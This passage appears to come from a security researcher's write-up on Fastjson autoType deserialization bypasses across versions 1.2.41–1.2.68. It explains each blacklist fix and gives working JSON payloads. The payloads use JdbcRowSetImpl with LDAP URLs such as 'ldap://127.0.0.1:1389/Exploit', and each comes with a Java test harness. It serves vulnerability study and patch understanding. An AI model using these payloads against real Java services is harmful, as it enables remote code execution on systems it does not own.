            if (clazz != null) {
                if (expectClass != null && !expectClass.isAssignableFrom(clazz)) {
                    throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                }
                return clazz;
            }
            // Position 3, autoTypeSupport is not enabled, black and white list will still be detected, blacklist first, then whitelist
            if (!autoTypeSupport) {
                for (int i = 0; i  " + expectClass.getName());
                        }
                        return clazz;
                    }
                }
            }
            // Position 4, after the black and white list, autoTypeSupport is turned on, and the target class is loaded
            if (autoTypeSupport || expectClass != null) {
                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
            }
            if (clazz != null) {
                // ClassLoader, DataSource subclass/subinterface detection
                if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
                        || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
                        ) {
                    throw new JSONException("autoType is not support. " + typeName);
                }
                if (expectClass != null) {
                    if (expectClass.isAssignableFrom(clazz)) {
                        return clazz;
                    } else {
                        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                    }
                }
            }
            if (!autoTypeSupport) {
                throw new JSONException("autoType is not support. " + typeName);
            }
            return clazz;
        }
Four position marks were made on it, because the following bypasses are also
related to these positions. This time the bypass is through the previous 1, 2,
3 and successfully entered the location 4 to load the target class. Position 4
loadclass is as follows:
Removed the `L` and `;` before and after className, in the form of
`Lcom.lang.Thread;`, this representation method is similar to the
representation method of classes in the JVM, and fastjson handles this
representation method. The previous blacklist detection was startedwith
detection, so you can add `L` and `;` to the class specified by @type to
bypass the blacklist detection.
Use the above JdbcRowSetImpl:
    {
      "rand1": {
        "@type": "Lcom.sun.rowset.JdbcRowSetImpl;",
        "dataSourceName": "ldap://localhost:1389/Object",
        "autoCommit": true
      }
    }
Test（jdk8u102，fastjson 1.2.41）：
    package com.longofo.test;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.ParserConfig;
    public class Test4 {
        public static void main(String[] args) {
            String payload = "{\"rand1\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://localhost:1389/Object\",\"autoCommit\":true}}";
            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
            //JSON.parse(payload); success
            //JSON.parseObject(payload); success
            //JSON.parseObject(payload,Object.class); success
            //JSON.parseObject(payload, User.class); success
        }
    }
result：
##### ver=1.2.42
In 1.2.42, the checkAutotype bypass of 1.2.25 ~ 1.2.41 was fixed, the
blacklist was changed to decimal, and the checkAutotype detection was changed
accordingly:
The blacklist has been changed to decimal, and the detection has been hashed
accordingly. However, it is consistent with the detection process in 1.2.25
above, except the tests with `startswith` are replaced with `hash operations`.
The fix for bypassing checkAutotype of 1.2.25 ~ 1.2.41 is the red box, judging
whether the className is `L` and`;`, if it is, then intercept the second
character and the penultimate character . Therefore, the bypass of
checkAutotype in version 1.2.42 is to double write `LL` and`;;`. After
interception, the process is the same as that of versions 1.2.25 ~ 1.2.41.
Use the above JdbcRowSetImpl:
    {
      "rand1": {
        "@type": "LLcom.sun.rowset.JdbcRowSetImpl;;",
        "dataSourceName": "ldap://localhost:1389/Object",
        "autoCommit": true
      }
    }
Test（jdk8u102，fastjson 1.2.42）:
    package com.longofo.test;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.ParserConfig;
    public class Test5 {
        public static void main(String[] args) {
            String payload = "{\"rand1\":{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://localhost:1389/Object\",\"autoCommit\":true}}";
            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
            //JSON.parse(payload); success
            //JSON.parseObject(payload); success
            //JSON.parseObject(payload,Object.class); success
            //JSON.parseObject(payload, User.class); success
        }
    }
结果：
##### ver=1.2.43
1.2.43 For the bypass repair method of 1.2.42:
Under the first if condition (beginning with `L` and ending with`;`), a
condition starting with`LL` is added. If the first condition is met and
starting with `LL`, an exception is thrown directly. So this repair method
cannot be bypassed. In addition to the special processing of `L` and`;`, `[`
is also treated specially, checkAutoType is bypassed again:
Use the above JdbcRowSetImpl：
    {"rand1":{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true]}}
Test（jdk8u102，fastjson 1.2.43）:
    package com.longofo.test;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.ParserConfig;
    public class Test6 {
        public static void main(String[] args) {
            String payload = "{\"rand1\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true]}}";
            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    //        JSON.parse(payload); success
            //JSON.parseObject(payload); success
            //JSON.parseObject(payload,Object.class); success
            JSON.parseObject(payload, User.class);
        }
    }
result：
##### ver=1.2.44
The 1.2.44 version fixes 1.2.43 bypass and handles `[`:
Deleted the previous judgment of the beginning of `L`, the end of`;`, and the
beginning of`LL`, changed it to an exception of `[` at the beginning or an
exception at the end of `;`, So the previous bypasses were fixed.
##### ver>=1.2.45&ver=1.2.48&ver<1.2.68`
Fixed the bypass of 1.2.47 in 1.2.48. In MiscCodec, where the loadClass is
processed, the cache is set to false:
Between 1.2.48 and the latest version 1.2.68, there are added blacklist
categories.
##### ver=1.2.68
1.2.68 is the latest version at present. Safemode was introduced in 1.2.68.
When safemode is turned on, @type this specialkey is completely useless. Both
whitelist and blacklist do not support autoType.
In this version, in addition to adding a blacklist, a blacklist is also
subtracted:
I don't know if there is any other security personnel running out of this
blacklist, whether it is a package name or a class name, and then it can be
used for malicious exploitation. It is a bit strange anyway.
#### Detect Fastjson
The more commonly method of detecting Fastjson is to use the dnslog. After
detecting it, use RCE Payload one by one. Colleagues said that it is possible
to get the paylaod of the echo, but the target container/framework is
different, and the echo method will be different. This is a bit difficult ...,